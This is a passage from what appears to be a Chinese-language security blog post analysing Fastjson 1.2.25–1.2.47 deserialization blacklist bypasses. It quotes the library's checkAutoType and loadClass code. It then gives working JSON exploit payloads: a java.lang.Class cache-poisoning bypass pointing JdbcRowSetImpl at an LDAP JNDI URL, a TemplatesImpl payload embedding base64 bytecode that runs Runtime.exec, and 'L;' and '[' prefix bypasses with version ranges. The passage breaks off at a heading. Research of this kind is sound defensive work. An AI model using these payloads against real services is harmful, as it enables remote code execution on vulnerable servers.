<p>我们往回调, 看看是从哪里调用到了checkAutoType<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531131011.png" alt="image.png"><br>如上图, 在json解析器parseObject中进行了调用, 在上个版本中, lexer扫描出类名后会直接loadClass, &#x3D;&#x3D;这个版本则是用ParseConfig.checkAutoType这个方法来加载类&#x3D;&#x3D;, 这个方法会对需要加载的类进行&#x3D;&#x3D;黑名单判断&#x3D;&#x3D;</p>
<p>这个黑名单涵盖的类算是非常多了, 直接找到一个可用的类比较困难, 我们先来看看checkAutoType是如何工作的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);  </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = deserializers.findClass(typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];  </span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;  </span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="comment">// classloader is danger  </span></span><br><span class="line">                || DataSource.class.isAssignableFrom(clazz) <span class="comment">// dataSource can load jdbc driver  </span></span><br><span class="line">                ) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;  </span><br><span class="line">                <span class="keyword">return</span> clazz;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;  </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如果开启了autoType (<code>autoTypeSupport == true</code>), fastjson会先校验白名单, 需要加载的类若在白名单中, 直接加载, 若不在则校验黑名单. 如果即不在白名单中也不在黑名单中, 则进入以下逻辑<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531141621.png" alt="image.png"></p>
<p>先从一个mapping中获取, 如何为空, 则从<code>deserializers</code>中获取, 如果也为空, 则进入到后面对于没开启autoType的判断逻辑, 我们暂且不看后面, 这里的mapping和deserializers显然是两个map, 是否可用向其中put进恶意的类呢?<br>先来看TypeUtils.getClassFromMapping的逻辑, 确实是从一个map中get而来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ConcurrentMap&lt;String, Class&lt;?&gt;&gt; mappings = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Class&lt;?&gt;&gt;(<span class="number">16</span>, <span class="number">0.75f</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142914.png" alt="image.png"></p>
<p>全局查找mappings.put, 有以下几个地方是可能可控的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531142755.png" alt="image.png"><br>后面三个都存在于TypeUtils.loadClass方法中, 代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;  </span><br><span class="line">    <span class="keyword">if</span> (className == <span class="literal">null</span> || className.length() == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;  </span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);  </span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);  </span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;  </span><br><span class="line">            clazz = classLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        e.printStackTrace();  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;  </span><br><span class="line">            clazz = contextClassLoader.loadClass(className);  </span><br><span class="line">            mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">return</span> clazz;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        clazz = Class.forName(className);  </span><br><span class="line">        mappings.put(className, clazz);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> clazz;  </span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;  </span><br><span class="line">        <span class="comment">// skip  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> clazz;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不难发现mappings实际上是对已经加载过的类的缓存. 也就是说, 被加载过的类都会存放在这里, 下次又需要加载的时候, 直接取出来用, 提高效率.<br>&#x3D;&#x3D;如何把我们的恶意类插入到mappings中呢?&#x3D;&#x3D; </p>
<p>我们返回到之前的调试过程思考: 当json的键为<code>@type</code>时, 它所对应的值(类名)会经过checkAutoType的审查, 但如果此时的恶意类作为一个其他类的Field(同样会被反序列化),或者说它的键名不是<code>@type</code>, 是否会经过checkAutoType呢?<br>全局搜索<code>TypeUtils.loadClass</code>, 看看除了checkAutoType还有哪里调用<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155451.png" alt="image.png"><br>如上图, 可控的只有四个, 而下面三个都是在checkAutoType中的, 无法利用, 我们聚焦于&#x3D;&#x3D;<code>MiscCodec</code>&#x3D;&#x3D;这个类中, 看一下这个类的定义<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531155729.png" alt="image.png"></p>
<p>很明显这是一个反序列化器的实现类, 这个反序列化器实现了对一些杂项类的反序列化, 其中包括<code>Class.class</code>:</p>
<p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531160027.png" alt="image.png"><br>对于一个<code>Class.class</code>, 该反序列化器直接调用<code>TypeUtils.loadClass</code>加载<code>strVal</code>, 那我们看一下<code>strVal</code>是什么<br>往上翻可以找到这个变量的来历<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531161326.png" alt="image.png"><br>实际上就是解析json中下一条键为”val”的值, 解析到的值String时, 直接赋值给strVal,<br>也就是说如果我们构造一个json字符串:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>虽然checkAutoType禁用了<code>com.sun.</code>, 但此时并不经过checkAutoType, <code>com.sun.rowset.JdbcRowSetImpl</code>会被<code>TypeUtils.loadClass</code>直接被加载一次, 然后把这个class缓存到mappings, 下次需要加载时就不经过checkAutoType直接从mappings中get了<br>于是就有了以下payload:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/ubjazx&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>当然, 也可以</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAgTEZhc3Rqc29uV2l0aFRlbXBsYXRlc0ltcGwkdGVzdDsBAApTb3VyY2VGaWxlAQAeRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbC5qYXZhDAAEAAUHABMBAB5GYXN0anNvbldpdGhUZW1wbGF0ZXNJbXBsJHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0AQAZRmFzdGpzb25XaXRoVGVtcGxhdGVzSW1wbAEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAE240YzE0NTY4MDc2MjAwNjUxMDABABVMbjRjMTQ1NjgwNzYyMDA2NTEwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAARAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span>        <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;a.b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这个方法通杀<code>1.2.25-1.2.47</code>版本, 在AutoType默认不开启时可用</p>
<h3 id="AutoType开启时的绕过-利用字符前缀"><a href="#AutoType开启时的绕过-利用字符前缀" class="headerlink" title="AutoType开启时的绕过 利用字符前缀"></a>AutoType开启时的绕过 利用字符前缀</h3><p>当AutoType开启时(<code>AutoTypeSupport == true</code>), 还有另一种绕过手法, 我们回去看checkAutoType的逻辑, 当开启AutoTypeSupport或设置了期望类型时, 会走到这一步, 直接调用了loadClass<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211345.png" alt="image.png"></p>
<p>但在这之前是过了一次黑名单的, 为了绕过黑名单,  在loadClass中有以下操作:<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531211721.png" alt="image.png"></p>
<p>当类名以<code>L</code>开头<code>;</code>结尾时, 去掉这两个字符然后loadClass, 注意此时是递归调用的, 因此可用有很多层<code>L</code>开头<code>;</code>结尾去包裹恶意类, 都是可用正常解析的, 同理<code>[</code>开头也有此操作<br>因此当开启了AutoType时, 有以下payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>而对于<code>[</code>如果直接使用<code>[com.sun.rowset.JdbcRowSetImpl</code>会报错:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#x27;[&#x27;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:669)</span><br><span class="line">	at com.alibaba.fastjson.serializer.ObjectArrayCodec.deserialze(ObjectArrayCodec.java:177)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:368)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)</span><br><span class="line">	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:137)</span><br><span class="line">	at com.alibaba.fastjson.JSON.parse(JSON.java:128)</span><br><span class="line">	at FastjsonWithJdbcRowSetImpl.withAutoTypeSupportAttackVersion_1_2_25(FastjsonWithJdbcRowSetImpl.java:41)</span><br><span class="line">	at FastjsonWithJdbcRowSetImpl.main(FastjsonWithJdbcRowSetImpl.java:10)</span><br></pre></td></tr></table></figure>
<p>打断点看看哪里出错了<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213537.png" alt="image.png"><br>在扫描完类名后需要一个<code>[</code>, 而当前的token是16(可用点进去看, 16代表逗号<code>,</code>), 那我们在逗号前加<code>[</code>即可<br>之后又会报错<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250531213830.png" alt="image.png"><br>那再加一个<code>&#123;</code>来规避这个报错<br>最后payload就是这样</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>当然也可以尝试之前的TemplatesImpl</p>
<p>经过尝试: 对于使用<code>L ;</code>绕过, 1.2.43版本中被修复了, 但这个版本依然可以使用<code>&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;, &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/knwwcb&quot;, &quot;autoCommit&quot;:true&#125;</code>这个payload, 直到1.2.44被修复</p>
<p>梳理出payload适用版本:</p>
<p>fastjson &lt; 1.2.43</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;LLLLcom.sun.rowset.JdbcRowSetImpl;;;;&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://127.0.0.1:1389/knwwcb&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>fastjson &lt; 1.2.44</p>
